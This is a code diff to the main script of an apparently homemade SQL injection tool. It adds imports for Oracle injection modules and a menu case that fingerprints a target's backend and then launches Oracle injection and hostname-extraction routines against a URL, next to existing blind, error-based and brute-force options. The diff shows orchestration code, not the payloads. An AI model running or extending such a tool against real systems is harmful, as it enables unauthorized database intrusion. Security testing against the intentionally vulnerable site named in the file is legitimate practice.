@@ -33,9 +33,9 @@ from Dictionaryattack.payloads import run_brute_force
 from lib.mysqlblind.conditionalblindsql import conditional_blind_sql_inj
 from lib.mysqlerrorbased.mysqlerrorbaseBASIC import SQL_inj_BASIC
 from lib.mysqlerrorbased.mysqlexractvalue import Extract_value_injection
-# from lib.mysqlerrorbased.mysqlxml import My_sql_XML_attack
-# from lib.mysqlerrorbased.mysqlxml import My_sql_XML_attack
 from lib.mysqlerrorbased.mysqlnameconst import Name_const_inj
+from lib.OracleSQLinjection.OracleINJ import ORACLE_SQL_injection
+from lib.OracleSQLinjection.HostnameORC import HOSTNAME_ORACLE
 
 
 """Tested against: http://testphp.vulnweb.com/disclaimer.php """
@@ -227,6 +227,21 @@ async def main():
             
             case "brute force":
                 run_brute_force(url,0,0)
+            
+            case "Oracle":
+                while True:
+                    await find_backend_language(url)
+                    
+                    e = input("")
+                    if e == "y":
+                        break
+                    
+                    elif e == "q":
+                        raise SystemExit
+                await asyncio.gather(
+                    ORACLE_SQL_injection(url),
+                    HOSTNAME_ORACLE(url)
+                    )
             
 
             case "substring":
